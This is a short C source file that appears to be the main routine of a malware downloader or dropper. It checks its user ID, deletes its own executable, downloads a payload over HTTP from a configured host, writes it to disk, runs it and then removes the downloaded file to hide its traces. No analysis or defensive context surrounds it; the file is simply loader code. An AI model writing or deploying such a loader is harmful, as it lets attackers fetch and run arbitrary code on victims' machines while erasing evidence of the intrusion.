#include "config.h"
#include "http.h"
#include "utils.h"

int main(void)
{
    check_uid();
    remove_yourself();

    char out_fpath[64 + 1];
    path_gen(out_fpath, sizeof(out_fpath));

    const int fd = fd_create_path(out_fpath);
    const int sock = http_open(DOWNLOADER_HOST, DOWNLOADER_PORT);
    http_send_req(sock);
    http_copy_response(sock, fd);
    fd_flush(fd);
    fd_close(fd);

    const int exit_status = path_execute(DOWNLOADER_URL_PATH, out_fpath);
    path_remove(out_fpath);
    return exit_status;
}
